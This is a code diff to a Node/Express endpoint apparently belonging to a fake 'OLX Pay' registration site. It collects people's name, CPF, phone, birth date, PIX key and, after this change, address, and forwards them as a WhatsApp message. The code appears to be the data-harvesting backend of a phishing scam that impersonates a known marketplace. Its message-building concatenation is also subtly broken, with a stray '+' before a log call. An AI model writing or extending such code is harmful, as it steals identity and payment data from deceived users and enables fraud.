@@ -725,34 +725,42 @@ app.post("/api/enviar-cadastro-olx", async (req, res) => {
     console.log("Dados recebidos:", JSON.stringify(dados));
 
     // Verificar se todos os dados foram fornecidos
-  if (!dados.nome || !dados.cpf || !dados.telefone || !dados.data_nascimento || !dados.pix_tipo || !dados.pix_chave) {
-      console.error("Dados incompletos recebidos");
-      return res.status(400).json({
-        success: false,
-        message: "Todos os campos obrigatórios devem ser preenchidos",
-      });
-    }
+  if (
+    !dados.nome ||
+    !dados.cpf ||
+    !dados.telefone ||
+    !dados.data_nascimento ||
+    !dados.pix_tipo ||
+    !dados.pix_chave ||
+    !dados.endereco
+  ) {
+    console.error("Dados incompletos recebidos");
+    return res.status(400).json({
+      success: false,
+      message: "Todos os campos obrigatórios devem ser preenchidos",
+    });
+  }
 
-    // Verificar status do WhatsApp antes de tentar enviar
-    if (!verificarStatusWhatsApp()) {
-      console.error("Tentativa de envio com WhatsApp desconectado");
-      return res.status(503).json({
-        success: false,
-        message:
-          "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
-      });
-    }
+  // Verificar status do WhatsApp antes de tentar enviar
+  if (!verificarStatusWhatsApp()) {
+    console.error("Tentativa de envio com WhatsApp desconectado");
+    return res.status(503).json({
+      success: false,
+      message:
+        "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
+    });
+  }
 
-    // Formatar mensagem com dados do cadastro (sem email)
-    const mensagem =
-      `*📝 NOVO CADASTRO OLX PAY*\n\n` +
-      `Nome: ${dados.nome}\n` +
-      `CPF: ${dados.cpf}\n` +
-      `Telefone: ${dados.telefone}\n` +
-      `Data de Nascimento: ${dados.data_nascimento}\n` +
-      `Tipo PIX: ${dados.pix_tipo}\n` +
-      `Chave PIX: ${dados.pix_chave}\n\n` +
-
+  // Formatar mensagem com dados do cadastro (sem email)
+  const mensagem =
+    `*📝 NOVO CADASTRO OLX PAY*\n\n` +
+    `Nome: ${dados.nome}\n` +
+    `CPF: ${dados.cpf}\n` +
+    `Telefone: ${dados.telefone}\n` +
+    `Data de Nascimento: ${dados.data_nascimento}\n` +
+    `Tipo PIX: ${dados.pix_tipo}\n` +
+    `Chave PIX: ${dados.pix_chave}\n` +
+    `Endereço: ${dados.endereco}\n\n` +
     console.log("Mensagem formatada, iniciando envio...");
 
     // Enviar mensagem para o WhatsApp
